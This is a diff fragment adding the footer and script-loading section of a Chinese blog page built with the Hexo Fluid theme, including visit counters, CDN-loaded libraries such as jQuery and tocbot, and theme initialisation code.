+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
